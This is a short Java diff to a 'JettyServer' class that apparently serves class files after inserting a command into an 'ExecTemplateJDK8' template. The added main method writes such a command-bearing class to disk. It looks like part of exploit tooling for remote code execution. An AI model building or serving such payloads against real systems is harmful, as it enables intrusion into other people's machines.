@@ -21,6 +21,7 @@ public class JettyServer implements Runnable{
     private int port;
     private Server server;
     private static String command;
+    private static String os;
 
 //    public JettyServer(int port) {
 //        this.port = port;
@@ -57,7 +58,6 @@ public class JettyServer implements Runnable{
             InputStream in = checkFilename(filename);
             byte[] transformed;
             ByteArrayInputStream bain = null;
-
             if (in != null) {
                 try {
                     transformed = insertCommand(in,command);
@@ -108,6 +108,13 @@ public class JettyServer implements Runnable{
         }
         return Thread.currentThread().getContextClassLoader().getResourceAsStream(template);
 
+    }
+
+    public static void main(String[] args) throws Exception {
+        byte[] bytes = insertCommand(checkFilename("ExecTemplateJDK8.class"), command);
+        FileOutputStream fileOutputStream = new FileOutputStream("E:\\ExecTemplateJDK8.class");
+        fileOutputStream.write(bytes);
+        fileOutputStream.close();
     }
 
 }
